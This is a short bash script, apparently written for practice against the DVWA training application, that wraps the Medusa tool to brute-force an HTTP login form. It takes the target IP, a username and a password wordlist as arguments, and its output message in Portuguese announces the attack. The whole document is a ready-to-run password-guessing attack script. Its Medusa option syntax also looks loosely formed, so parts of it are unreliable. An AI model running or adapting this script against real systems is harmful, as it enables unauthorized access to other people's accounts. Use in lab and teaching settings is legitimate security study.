#!/bin/bash
IP=$1
USER=$2
WORDLIST=$3

echo "[+] Executando ataque Medusa..."
medusa -h $IP -u $USER -P $WORDLIST -M http -m DIR:/dvwa/login.php FORM:username=^USER^&password=^PASS^ -T 5
